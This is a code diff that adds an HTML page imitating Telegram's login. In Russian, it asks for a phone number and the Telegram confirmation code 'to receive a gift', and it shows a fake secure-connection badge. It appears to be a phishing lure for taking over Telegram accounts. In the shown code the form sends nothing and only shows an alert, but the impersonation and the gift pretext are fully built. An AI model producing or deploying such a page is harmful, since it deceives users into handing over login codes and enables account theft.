@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Authorization</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #0f0f23;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 20% 50%, rgba(88, 101, 242, 0.15) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 80%, rgba(139, 92, 246, 0.15) 0%, transparent 50%);
+            pointer-events: none;
+        }
+        
+        .container {
+            background: #1a1a2e;
+            border-radius: 24px;
+            box-shadow: 0 24px 64px rgba(0, 0, 0, 0.5),
+                        0 0 0 1px rgba(255, 255, 255, 0.05);
+            padding: 48px 40px;
+            max-width: 420px;
+            width: 100%;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        
+        .logo svg {
+            width: 72px;
+            height: 72px;
+            filter: drop-shadow(0 4px 12px rgba(88, 101, 242, 0.3));
+        }
+        
+        .title {
+            text-align: center;
+            font-size: 32px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
+        
+        .subtitle {
+            text-align: center;
+            font-size: 15px;
+            color: #8b8b9e;
+            margin-bottom: 40px;
+            line-height: 1.5;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        label {
+            display: block;
+            font-size: 13px;
+            color: #a0a0b8;
+            margin-bottom: 10px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 16px 20px;
+            border: 1.5px solid #2a2a3e;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            outline: none;
+            background: #0f0f23;
+            color: #ffffff;
+            font-family: inherit;
+        }
+        
+        input::placeholder {
+            color: #4a4a5e;
+        }
+        
+        input:focus {
+            border-color: #5865f2;
+            box-shadow: 0 0 0 4px rgba(88, 101, 242, 0.1),
+                        0 0 0 1px rgba(88, 101, 242, 0.3);
+            background: #141428;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #5865f2 0%, #8b5cf6 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            margin-top: 8px;
+            box-shadow: 0 4px 16px rgba(88, 101, 242, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .btn:hover::before {
+            left: 100%;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(88, 101, 242, 0.4);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn-secondary {
+            background: #2a2a3e;
+            box-shadow: none;
+        }
+        
+        .btn-secondary:hover {
+            background: #34344e;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        }
+        
+        .divider {
+            text-align: center;
+            margin: 32px 0;
+            position: relative;
+        }
+        
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #2a2a3e, transparent);
+        }
+        
+        .divider span {
+            background: #1a1a2e;
+            padding: 0 16px;
+            color: #6a6a7e;
+            font-size: 13px;
+            position: relative;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 32px;
+            font-size: 12px;
+            color: #6a6a7e;
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 24px;
+            padding: 12px;
+            background: rgba(88, 101, 242, 0.1);
+            border-radius: 8px;
+            border: 1px solid rgba(88, 101, 242, 0.2);
+        }
+        
+        .security-badge svg {
+            width: 16px;
+            height: 16px;
+            fill: #5865f2;
+        }
+        
+        .security-badge span {
+            font-size: 12px;
+            color: #8b8b9e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="120" cy="120" r="120" fill="#0088cc"/>
+                <path d="M81 140L120 120L81 100V140Z" fill="white"/>
+                <path d="M120 120L159 100V140L120 120Z" fill="white" fill-opacity="0.8"/>
+                <path d="M159 140L120 160L159 180V140Z" fill="white"/>
+            </svg>
+        </div>
+        <h1 class="title">Авторизация Telegram</h1>
+        <p class="subtitle">Для получения подарка необходимо подтвердить вашу личность</p>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="phone">Номер телефона</label>
+                <input type="tel" id="phone" placeholder="+7 (999) 123-45-67" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="code">Код подтверждения</label>
+                <input type="text" id="code" placeholder="Введите код из Telegram" required>
+            </div>
+            
+            <button type="submit" class="btn">Подтвердить</button>
+        </form>
+        
+        <div class="divider">
+            <span>или</span>
+        </div>
+        
+        <button class="btn btn-secondary" onclick="window.Telegram.WebApp.close()">Отмена</button>
+        
+        <div class="security-badge">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+            <span>Защищенное соединение</span>
+        </div>
+    </div>
+    
+    <script>
+        if (window.Telegram && window.Telegram.WebApp) {
+            window.Telegram.WebApp.ready();
+            window.Telegram.WebApp.expand();
+        }
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert('Проверка данных...');
+        });
+    </script>
+</body>
+</html>
